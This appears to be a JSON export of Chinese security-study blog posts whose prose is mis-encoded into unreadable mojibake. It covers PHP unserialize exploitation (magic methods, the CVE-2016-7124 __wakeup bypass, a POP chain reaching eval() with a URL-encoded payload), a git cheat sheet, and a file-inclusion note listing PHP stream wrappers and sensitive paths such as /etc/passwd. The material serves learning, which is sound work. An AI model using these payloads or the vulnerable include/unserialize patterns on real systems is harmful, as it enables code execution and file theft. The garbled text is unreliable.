&#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;; //æœªå¢åŠ ç›¸åº”å†…å®¹ echo(&#x27;ååºåˆ—åŒ–ä¹‹å‰æ•°å€¼ä¸ºï¼šO:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class)); //$testSerialize = serialize($test1); è¾“å‡ºï¼š åœ¨ååºåˆ—åŒ–åçš„å¯¹è±¡ä¸­ï¼Œå¤šäº†ä¸€ä¸ªå­—æ®µflagï¼Œå€¼ä¸ºnullï¼› å¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­å¢åŠ ç›¸å…³å†…å®¹ï¼Œä½†æ˜¯å®šä¹‰çš„ç±»ä¸­æ²¡æœ‰ç›¸å…³å˜é‡ä¼šæ€ä¹ˆæ ·ï¼Ÿ 1234567891011121314151617181920class test&#123; var $name; var $age; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = &#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;flag&quot;;s:4:&quot;asdf&quot;;&#125;&#x27;; //æœªå¢åŠ ç›¸åº”å†…å®¹ echo(&#x27;ååºåˆ—åŒ–ä¹‹å‰æ•°å€¼ä¸ºï¼šO:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class)); æ­¤æ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„falseã€‚ æ€»ç»“æ‰€ä»¥ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œunserilizeè¦æˆåŠŸååºåˆ—åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ¡ä»¶æœ‰ä»¥ä¸‹ï¼š å­—ç¬¦ä¸²çš„æ ¼å¼ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–çš„æ ¼å¼ï¼Œå¦åˆ™ä¼šè¿”å›false åœ¨ååºåˆ—åŒ–çš„ç±»ä¸­ï¼ŒåŒ…å«å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å˜é‡ï¼Œå¦åˆ™è¿”å›false å¤„ç†è¯¥å­—ç¬¦ä¸²çš„phpæ–‡ä»¶ä¸­ï¼Œåº”åŒ…å«è¯¥ç±»çš„å®šä¹‰ï¼ˆè¯¥phpæ–‡ä»¶å†…æœ‰å®šä¹‰/åŒ…å«çš„æ–‡ä»¶ä¸­æœ‰å®šä¹‰ï¼‰ é­”æ³•å‡½æ•°https://www.php.net/manual/zh/language.oop5.magic.php __construct(): å…è¡Œå¼€å‘è€…åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä»£ç ä¸­å‡ºç°newå…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè§¦å‘è¯¥å‡½æ•° __destruct(): ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç»“æŸåˆ›å»ºï¼Œä¸å†ä½¿ç”¨è¯¥å¯¹è±¡æ—¶ï¼Œä¼šè§¦å‘è¯¥å‡½æ•° æ —å­5 1234567891011121314class fxxy&#123; var $name = &quot;fxxy&quot;; function __construct()&#123; echo &quot;this is __construct()&quot;; $this-&gt;name = &quot;fxxy&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;; &#125; &#125; $test = new fxxy(); echo(&#x27;&lt;br&gt;&#x27;.$test-&gt;name.&#x27;&lt;br&gt;&#x27;); è¾“å‡ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œåœ¨é¡µé¢ä¸­ä¸ä¼šå†ä½¿ç”¨åˆ°testè¿™ä¸ªå¯¹è±¡åï¼Œç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨äº†__destructå‡½æ•° æ —å­ï¼ˆ__destruct()ä¸unserilize()ï¼‰ 1234567891011121314151617class fxxy&#123; var $name = &quot;fxxy&quot;; function __construct()&#123; echo &quot;this is __construct()&quot;; $this-&gt;name = &quot;fxxy&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;; &#125; &#125; //$test = new fxxy(); $value = &#x27;O:4:&quot;fxxy&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125;&#x27;; //echo($value); unserialize($value); //echo(&#x27;&lt;br&gt;&#x27;.$test-&gt;name.&#x27;&lt;br&gt;&#x27;); è¾“å‡ºä¸ºï¼š å¯è§ï¼Œåœ¨è¿ç”¨unserilize()å‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨__destruct()å‡½æ•° __sleep(): å…³è”å‡½æ•°ï¼šserialize() ä½œç”¨ï¼šåœ¨è°ƒç”¨serialize()å‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šå…ˆæŸ¥æ‰¾è¯¥ç±»ä¸­æ˜¯å¦å­˜åœ¨__sleep()å‡½æ•°ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šä¼˜å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œè¿”å›é¢„å…ˆè®¾å®šå¥½çš„å…è®¸è¢«åºåˆ—åŒ–çš„å˜é‡æ•°ç»„ã€‚ åœ¨ä¸Šæ–‡ä¸­ï¼Œä»¥æ —å­2ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³è®©æŸäº›å˜é‡æ˜¾ç¤ºå‡ºæ¥æ€ä¹ˆåŠï¼Ÿå¢åŠ __sleep()å‡½æ•°ï¼Œå¹¶åœ¨ä¸­å®šä¹‰å¯ä»¥è¢«åºåˆ—åŒ–çš„å˜é‡æˆ–æ–¹æ³• æ —å­6 123456789101112131415161718192021class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; //$this-&gt;flag = $flag; &#125; function __sleep()&#123; return array(&quot;name&quot;,&quot;age&quot;); &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&#x27;&lt;br&gt;&#x27;); echo(serialize($test1));//echoå‡½æ•°å¤„ç†çš„æ˜¯å­—ç¬¦ä¸²å˜é‡ æ­¤æ—¶è¾“å‡ºï¼š å¯ä»¥çœ‹åˆ°è¾“å‡ºä¸­æ²¡æœ‰äº†flagå­—æ®µ __wakeup() å…³è”å‡½æ•°ï¼šunserialize() ä½œç”¨ï¼šå½“è°ƒç”¨unserilizeå‡½æ•°æ—¶ï¼Œä¼šå…ˆæ£€æŸ¥è¦ååºåˆ—åŒ–çš„ç±»ä¸­æ˜¯å¦æœ‰__wakeup()æ–¹æ³•ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä¼˜å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œé€šå¸¸ç”¨æ¥æ‰§è¡Œä¸€äº›ååºåˆ—åŒ–ä¹‹å‰çš„ä¸€äº›èµ„æºå‡†å¤‡æˆ–åˆå§‹åŒ–æ“ä½œã€‚ __toString() å®šä¹‰åœ¨ç±»ä¸­ ç”¨äºå¤„ç†å½“è¿™ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†æ—¶è¿”å›çš„å†…å®¹ æ —å­7 123456789101112131415161718192021class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; function __toString()&#123; return &quot;can&#x27;t echo this object&quot;; &#125; &#125; class test2&#123; var $testClass; &#125; $test1 = new test(&#x27;user&#x27;,20); echo($test1); è¾“å‡ºï¼š __call() å½“è®¿é—®è¯¥ç±»ä¸­ä¸å­˜åœ¨æ–¹æ³•æ—¶ï¼Œä¼šè§¦å‘æ­¤æ–¹æ³• __get() å½“è®¿é—®è¯¥ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œä¼šè§¦å‘æ­¤æ–¹æ³• çœ‹ä¸€ä¸‹callå’Œgetçš„å®è·µ ä»£ç  123456789101112131415161718&lt;?php class fxxy&#123; public $a = 1; function __call($name,$argu)&#123; echo &quot;don&#x27;t have the function!&lt;br&gt;&quot;; &#125; function __get($name)&#123; echo &quot;don&#x27;t have the attr&quot;; &#125; &#125; $test = new fxxy(); $test-&gt;hello(); echo($test-&gt;b);?&gt; å°å®è·µå°é¢˜ç›®åœ¨test.phpä¸­æˆ‘ä»¬å†™å…¥ä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132&lt;?php class test&#123; var $name; var $pwd; function __construct($name,$pwd)&#123; $this-&gt;name = $name; $this-&gt;pwd = $pwd; &#125; function getflag()&#123; if($this-&gt;name === &quot;welcome&quot; &amp;&amp; $this-&gt;pwd === &quot;password&quot;)&#123; include(&#x27;flag.php&#x27;); &#125; else&#123; echo(&quot;wrong name and passwords&quot;); &#125; &#125; &#125; $query = $_GET[&#x27;id&#x27;]; if(!empty($query))&#123; $flag = unserialize($query); $flag-&gt;getflag(); &#125; else&#123; echo(&quot;Plz input id~&quot;); &#125; $test1 = new test(&quot;welcome&quot;,&quot;password&quot;); //echo(serialize($test1)); show_source(__FILE__)?&gt; åˆ†æï¼šä»£ç ä¼šå¯¹æäº¤çš„idè¿›è¡Œååºåˆ—åŒ–ï¼Œå½“ååºåˆ—åŒ–çš„nameå˜é‡ä¸pwdå˜é‡ä¸ä»£ç æŒ‡å®šçš„ç›¸åŒæ—¶ï¼Œåˆ™ä¼šåŒ…å«flag.phpï¼Œè¾“å‡ºflagã€‚ æ–¹æ³•ï¼šæ„é€ testç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå‚æ•°å€¼ä¸ºwelcomeå’Œpasswordï¼Œç„¶åä¼ å…¥id CVE-2016-7124 ç‰ˆæœ¬ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 æ ¸å¿ƒï¼šå½“åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼Œå¯¹è±¡å˜é‡çš„ä¸ªæ•°å¤§äºå®é™…å·²å®šä¹‰çš„ç±»ä¸­çš„ä¸ªæ•°æ—¶ï¼Œä¼šç»•è¿‡__wakeup()å‡½æ•° demo123456789101112131415161718192021222324252627&lt;?php class A&#123; var $name = &#x27;merryting&#x27; ; function __destruct()&#123; echo(&quot;good bye &quot;.$this-&gt;name); $fp = fopen(&quot;test.txt&quot;,&quot;w&quot;); fwrite($fp,$this-&gt;name); fclose($fp); &#125; function __wakeup()&#123; echo(1); $this-&gt;name = &quot;merryting&quot;; &#125; &#125; //$test = new A(&#x27;fxxy&#x27;); //echo(serialize($test)); //O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125; $name = $_GET[&#x27;name&#x27;]; echo($name); unserialize($name);?&gt; ä»£ç åˆ†æï¼š åœ¨æ‰§è¡Œdestroy()å‡½æ•°ä¸­çš„æ–‡ä»¶å†™å…¥åŠŸèƒ½ä¹‹å‰ï¼Œä¼šè°ƒç”¨wakeup()å‡½æ•°å°†æ­¤å¯¹è±¡çš„nameè®¾ç½®ä¸ºï¼šmerryting ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¼ å…¥å¸¸è§„çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå­˜å…¥çš„nameå§‹ç»ˆæ˜¯merryting æ¯”å¦‚æˆ‘ä¼ å…¥çš„æ˜¯fxxyï¼šè¾“å‡ºå’Œå†™å…¥çš„éƒ½æ˜¯merryting é‚£æ€ä¹ˆåˆ©ç”¨ï¼Ÿcve-2016-7124çš„æ ¸å¿ƒå°±æ˜¯ç»•è¿‡__wakeup()å‡½æ•°ï¼Œæ€ä¹ˆç»•è¿‡ï¼Œå°±æ˜¯å°†ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å˜é‡çš„ä¸ªæ•°è®¾ç½®å¤§äºå®é™…çš„ä¸ªæ•° å‰ï¼šO:1:â€Aâ€:1:{s:4:â€nameâ€;s:4:â€fxxyâ€;} åï¼šO:1:â€Aâ€:2:{s:4:â€nameâ€;s:4:â€fxxyâ€;} æ­¤æ—¶ï¼Œæµè§ˆå™¨è¾“å‡ºä¸ºï¼š æ­¤æ—¶å¯ä»¥çœ‹åˆ°ï¼Œåå­—æ›´æ¢äº†ï¼Œä¸æ˜¯wakeup()å‡½æ•°ä¸­æ›¿æ¢çš„æ•°æ®ï¼Œè¯´æ˜ç»•è¿‡äº†wakeup()å‡½æ•°ã€‚ ç»•è¿‡äº†wakeup()å‡½æ•°ï¼Œæ¥ä¸‹æ¥åšä»€ä¹ˆï¼Ÿunserilize()å‡½æ•°åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œç»“æŸæ—¶å¦‚æœè¯¥ç±»ä¸­å®šä¹‰äº†destruct()å‡½æ•°ï¼Œåˆ™ä¼šè°ƒç”¨æ­¤å‡½æ•°ï¼Œæ­¤å‡½æ•°çš„ä½œç”¨è§ä¸Šæ–‡ã€‚å¦‚æœæ­¤æ—¶__destruct()å‡½æ•°ä¸­å­˜åœ¨å¯åˆ©ç”¨ç‚¹ï¼Œåˆ™å¯èƒ½é€ æˆååºåˆ—åŒ–æ¼æ´ï¼ˆå¼€å‘äººå‘˜åº”è¯¥æ²¡æœ‰è¿™ä¹ˆè ¢ï¼Œåœ¨æ˜¾è€Œæ˜“è§çš„åœ°æ–¹å†™æ•æ„Ÿæ“ä½œï¼‰ï¼Œé‚£ä¹ˆï¼Œä¸‹é¢å­¦ä¹ ååºåˆ—åŒ–ä¸­æ¯”è¾ƒå¤æ‚çš„ä¸€ä¸ªä¸œè¥¿â€”â€”POPé“¾ åˆè¯†POPé“¾ ä»€ä¹ˆæ˜¯popé“¾ï¼Ÿ å‡è®¾ç°åœ¨æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„unserilizeç‚¹ï¼Œä½†æ˜¯åœ¨è¯¥ç±»ä¸‹çš„é­”æ³•å‡½æ•°ä¸­æ²¡æœ‰æ•æ„Ÿçš„æ“ä½œï¼Œç®€è¨€ä¹‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªåˆ©ç”¨å…¥å£ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œæ­¤æ—¶ï¼Œå¦‚æœåœ¨é­”æ³•å‡½æ•°ä¸­ï¼Œæœ‰ä»£ç ç‰‡æ®µè°ƒç”¨äº†å…¶ä»–é¡µé¢çš„å±æ€§ï¼ˆæ–¹æ³•ï¼‰ï¼Œåœ¨è¢«è°ƒç”¨çš„å±æ€§ï¼ˆæ–¹æ³•ï¼‰ä¸­å­˜åœ¨åŒåçš„é­”æ³•å‡½æ•°/æ™®é€šå‡½æ•°ï¼Œä¸”è¯¥å‡½æ•°ä¸­å­˜åœ¨ä¸€äº›æ•æ„Ÿæ“ä½œï¼Œé‚£æˆ‘ä»¬å°±ç›¸å½“äºæ‰¾åˆ°ä¸€æ¡è·¯é€šåˆ°æ¼æ´é‚£é‡Œã€‚ åƒä¸Šé¢è¿™æ ·ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯åˆ©ç”¨ç‚¹åï¼Œä¸æ–­é€’æ¨ï¼Œåœ¨ä»è¢«è°ƒç”¨çš„å±æ€§ï¼ˆæ–¹æ³•ï¼‰ä¸­å¯»æ‰¾æ•æ„Ÿæ“ä½œï¼Œæœ€ç»ˆä¸²è”èµ·æ¥ï¼Œå°±åƒä¸€ä¸ªé“¾æ¡ä¸€æ ·ï¼Œé€šè¿‡å±‚å±‚æŸ¥æ‰¾ï¼Œå°†å…¥å£å’Œç›®çš„åœ°è¿èµ·æ¥çš„æ–¹å¼ï¼Œå°±æ˜¯POPé“¾ demoå€Ÿç”¨æŸ æª¬å¸ˆå‚…çš„ä»£ç å­¦ä¹ ä¸€ä¸‹~ 1234567891011121314151617181920212223242526class lemon &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new normal(); &#125; function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class normal &#123; function action() &#123; echo &quot;hello&quot;; &#125;&#125;class evil &#123; private $data; function action() &#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET[&#x27;d&#x27;]); åˆ†æå¦‚ä¸‹ï¼š å¯æ§ç‚¹ï¼šunserilize()å‡½æ•° åœ¨ä¸Šé¢å†™çš„3ä¸ªç±»ä¸­ï¼Œå½“è°ƒç”¨unserilize()å‡½æ•°æ—¶ï¼Œåªä¼šå‘åºåˆ—åŒ–lemonè¿™ä¸ªç±»ï¼Œå› ä¸ºåªæœ‰è¯¥ç±»ä¸­æœ‰__destruct()å‡½æ•°ï¼Œä¸”è¯¥å‡½æ•°ä¼šè°ƒç”¨normalç±»ä¸­çš„action()æ–¹æ³• æ•æ„Ÿä»£ç åœ¨å“ªï¼Ÿåœ¨evilç±»ä¸­çš„action()æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†eval()å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œphpä»£ç  æ€è€ƒç‚¹ï¼šå¦‚ä½•é€šè¿‡ååºåˆ—lemonç±»æ¥è°ƒç”¨evalç±»ä¸­çš„actionæ–¹æ³•ã€‚ æ€è€ƒè¿‡ç¨‹ï¼šåœ¨åŸæ¥çš„å‡½æ•°ä¸­destruct()å‡½æ•°newçš„æ˜¯normolç±»ï¼Œç°åœ¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„æ˜¯evilç±»ä¸­çš„action()ï¼Œé‚£å°±æŠŠnewçš„ç±»æ¢æˆevilï¼Œç„¶ååœ¨åé¢unserilize()è¿‡ç¨‹ä¸­ï¼Œè§¦å‘destruct()å‡½æ•°æ—¶ï¼Œ$this-&gt;ClassObj-&gt;action()æŒ‡å‘çš„å°±æ˜¯evilä¸­çš„action()ï¼Œå®éªŒä¸€ä¸‹ ç”Ÿæˆpopé“¾ 123456789101112class lemon&#123; protected $ClassObj; function __construct()&#123; $this-&gt;ClassObj = new evil(); &#125; &#125; class evil &#123; private $data = &quot;phpinfo()&quot;; &#125; var_dump(new lemon()); echo &#x27;&lt;br&gt;&#x27;; echo serialize(new lemon()); O:5:&quot;lemon&quot;:1:&#123;s:11:&quot;*ClassObj&quot;;O:4:&quot;evil&quot;:1:&#123;s:10:&quot;evildata&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125; å°†è¿™ä¸ªå€¼ä¼ ç»™dï¼Œå‘ç°æç¤º æŠ¥äº†ä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ å› ä¸ºï¼serializeåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œprivateã€publicã€protectedä¸‰ä¸ªä¸åŒçš„å±æ€§ï¼Œåºåˆ—åŒ–å‡ºæ¥çš„æ˜¯æœ‰ä¸åŒçš„ï¼Œç”¨pythonæŠ“ä¸€ä¸‹ï¼Œæ­¤æ—¶ï¼Œè¾“å‡ºæ˜¯è¿™æ ·çš„ï¼šO:5:â€lemonâ€:1:{s:11:â€\\x00*\\x00ClassObjâ€;O:4:â€evilâ€:1:{s:10:â€\\x00evil\\x00dataâ€;s:10:â€phpinfo();â€;}} å‘ç°privateå±æ€§çš„classobjå‰é¢å¢åŠ äº†\\x00*\\x00 åœ¨privateå±æ€§çš„dataå‰å¢åŠ äº†\\x00\\x00 åœ¨æµè§ˆå™¨è¾“å‡ºçš„æ—¶å€™ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼ŒæŠŠä»–urlencodeä¸€ä¸‹å†è¾“å‡ºåä¼ ç»™dï¼Œè¾“å‡ºäº†æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼š 1O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D è¿™ä¸ªå°demoæ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ¶‰åŠäº†ä¸¤ä¸ªç±»ï¼Œå®é™…æƒ…å†µä¸­ä¼šæ›´å¤æ‚. æ€»ç»“éœ€è¦æ˜ç™½ä¸‹é¢å‡ ç‚¹ ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–æ¼æ´ï¼šç›¸å…³äººå‘˜åˆ©ç”¨å¯æ§çš„unserilize()è¾“å…¥ï¼Œç»è¿‡ä¸€ç³»åˆ—å‰–æï¼Œæ„é€ popé“¾ï¼Œä»è€Œè¾¾åˆ°æ•æ„Ÿæ“ä½œç›®çš„ åœ¨ä½¿ç”¨serialize()å‡½æ•°å’Œunserilize()å‡½æ•°æ—¶ï¼Œç›¸å…³é­”æ³•å‡½æ•°çš„è°ƒç”¨é¡ºåº CVE-2016-7124çš„æ ¸å¿ƒ serialize()å‡½æ•°è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼Œä¸åŒå±æ€§åºåˆ—åŒ–çš„åŒºåˆ« ä»€ä¹ˆæ˜¯popé“¾ï¼Œå¦‚ä½•æ„é€ popé“¾ referhttp://redteam.today/2017/10/01/POPé“¾å­¦ä¹ / https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html https://xz.aliyun.com/t/378 https://www.kingkk.com/2018/07/phpååºåˆ—åŒ–æ¼æ´/ https://chybeta.github.io/2017/06/17/æµ…è°ˆphpååºåˆ—åŒ–æ¼æ´/","categories":[],"tags":[{"name":"php, web","slug":"php-web","permalink":"http://example.com/tags/php-web/"}]},{"title":"gitç¬”è®°","slug":"gitç¬”è®°","date":"2019-09-14T16:00:00.000Z","updated":"2021-10-22T08:33:53.684Z","comments":true,"path":"2019/09/15/gitç¬”è®°/","link":"","permalink":"http://example.com/2019/09/15/git%E7%AC%94%E8%AE%B0/","excerpt":"è‡ªæŸ¥ç¬”è®°","text":"è‡ªæŸ¥ç¬”è®° åˆ›å»ºåˆ†æ”¯/åˆ‡æ¢åˆ†æ”¯ 1git checkout [-b] åˆ†æ”¯å æŸ¥çœ‹å½“å‰åˆ†æ”¯ 1git branch åˆ›å»ºäº‘ç«¯åˆ†æ”¯ 1git push -u origin loginAndUser åˆå¹¶åˆ†æ”¯ 1git merge åˆ†æ”¯å å°†ä¿®æ”¹æ–‡ä»¶æ·»åŠ åˆ°ç¼“å­˜åŒº 1git add . æäº¤ä»£ç  1git commit -m &quot;å¤‡æ³¨å†…å®¹&quot; åˆ é™¤åˆ†æ”¯ 1git branch -d åˆ†æ”¯å æŠ“å–è¿œç¨‹ä»“åº“ 12git pullgit fetch","categories":[],"tags":[]},{"title":"æ–‡ä»¶åŒ…å«å­¦ä¹ ","slug":"æ–‡ä»¶åŒ…å«","date":"2019-08-15T16:00:00.000Z","updated":"2021-10-22T08:29:58.187Z","comments":true,"path":"2019/08/16/æ–‡ä»¶åŒ…å«/","link":"","permalink":"http://example.com/2019/08/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"ç›¸å…³å‡½æ•° include() include(include_path) ä½œç”¨ï¼šåŒ…å«å¹¶æŒ‡å®šinclude_pathæŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœå‡ºé”™è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œç”Ÿæˆä¸€ä¸ªè­¦å‘Š","text":"ç›¸å…³å‡½æ•° include() include(include_path) ä½œç”¨ï¼šåŒ…å«å¹¶æŒ‡å®šinclude_pathæŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœå‡ºé”™è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œç”Ÿæˆä¸€ä¸ªè­¦å‘Š include_once() ä½œç”¨ï¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ï¼Œä½†æ˜¯å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶åªä¼šåŒ…å«ä¸€æ¬¡ require() require(include_path) åŒ…å«å¹¶æŒ‡å®šinclude_pathæŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœå‡ºé”™ä¼šæŠ¥é”™ï¼Œä¸ä¼šå†ç»§ç»­æ‰§è¡Œ require_once() å’Œrequireç±»ä¼¼ï¼Œä½†æ˜¯å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶åªä¼šåŒ…å«ä¸€æ¬¡ æ³¨æ„ï¼šä»¥ä¸Šå››ä¸ªåŒ…å«æ–‡ä»¶çš„å‡½æ•°ï¼Œå¯¹äºåŒ…å«çš„æ–‡ä»¶ä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œéƒ½ä¼šè¢«å½“ä½œPHPæ–‡ä»¶æ¥æ‰§è¡Œ requireå’Œincludeçš„åŒºåˆ«ï¼š requireï¼šåªè¦ç¨‹åºå¼€å§‹æ‰§è¡Œï¼Œåˆ™ç«‹å³åŒ…å«requireæŒ‡å®šçš„æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œä¸€èˆ¬ç”¨æ¥åŒ…å«ç±»æ–‡ä»¶ã€æ•°æ®åº“ç­‰æ–‡ä»¶ includeï¼šåªæœ‰æ‰§è¡Œçš„ä»£ç åˆ°includeæ—¶ï¼Œæ‰ä¼šåŒ…å«è¯¥æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¸€èˆ¬ç”¨æ¥åŒ…å«htmlæ¨¡æ¿ä¹‹ç±»çš„æ–‡ä»¶ PHPä¼ªåè®®æ–‡ä»¶åŒ…å«https://www.php.net/manual/zh/wrappers.data.php php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,å¯ä»¥è¯»å–åˆ°postæ²¡æœ‰è§£æçš„åŸå§‹æ•°æ®, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚ æ³¨ï¼šenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚ ä½¿ç”¨æ¡ä»¶ï¼šallow_url_include = on demo test.phpä¸­ï¼ˆåç»­å¯¹åè®®çš„æµ‹è¯•éƒ½ç”¨æ­¤phpè¿›è¡Œï¼‰: 1234567&lt;?php $file = $_GET[&#x27;file&#x27;]; include($file); ?&gt; php://filter ä½œç”¨ï¼šç”¨é€‰å®šçš„è¿‡æ»¤å™¨è¯»/å†™å…¥æ•°æ®æµ æ ¼å¼ 1php://filter/read=è¿‡æ»¤å™¨åç§°(å³æ•°æ®æµçš„åŠ å¯†æ–¹å¼)/resource=è¦è¯»å–/å†™å…¥çš„é“¾è¡¨ ä¾‹å­ 123456php://filter/read=convert.base64/resource=path //å°†pathæ–‡ä»¶çš„å†…å®¹ç»base64åŠ å¯†åè¾“å‡º//å†™å…¥php://filter/write=convert.base64/resource=example.txt,&quot;hello world&quot;å½“éœ€è¦å¤šä¸ªè¿‡æ»¤å™¨æ—¶ï¼Œä»¥|åˆ†éš” æ›´å¤šå‚è€ƒhttps://www.php.net/manual/zh/wrappers.php.php phar:// æ¡ä»¶ï¼šPHP &gt;= 5.3.0 è®¿é—®ä¸€ä¸ªå‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ è·¯å¾„å¯ä»¥ç»å¯¹è·¯å¾„ä¹Ÿå¯ä»¥ç›¸å¯¹è·¯å¾„ zip:// æ¡ä»¶ï¼šphp &gt;= 5.3.0 è®¿é—®ä¸€ä¸ªå‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ æ ¼å¼ï¼šzip://archive.zip#dir/file.txt data:// æ¡ä»¶ï¼š allow_url_open = on allow_url_include = on php &gt;= 5.2 æ ¼å¼ï¼šdata://èµ„æºç±»å‹,[ç¼–ç ];å†…å®¹ ä¸€äº›é‡è¦æ–‡ä»¶è·¯å¾„1234567891011121314151617181920/etc/passwd# æ—¥å¿—æ–‡ä»¶/var/log/apacheapache/logs/error.logapache/logs/access.log# 